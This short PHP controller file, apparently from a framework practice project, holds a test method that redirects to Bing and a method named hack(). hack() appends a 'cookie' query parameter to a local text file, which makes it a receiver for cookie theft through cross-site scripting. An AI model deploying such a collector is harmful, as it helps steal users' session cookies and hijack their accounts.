<?php

namespace app\controller\backend;// 强制要求

// 将核心控制器导入到当前的名字空间
use core\Controller;

class TestController extends Controller
{
    public function test()
    {
        $o = new \app\model\TestModel('Product');
        $o->challenge();
        echo '感觉自己萌萌哒。';
        $this->redirect('http://www.bing.com');
    }

    public function hack()
    {
        file_put_contents('./1.txt', $_GET['cookie'] . "\r\n", FILE_APPEND);
    }
}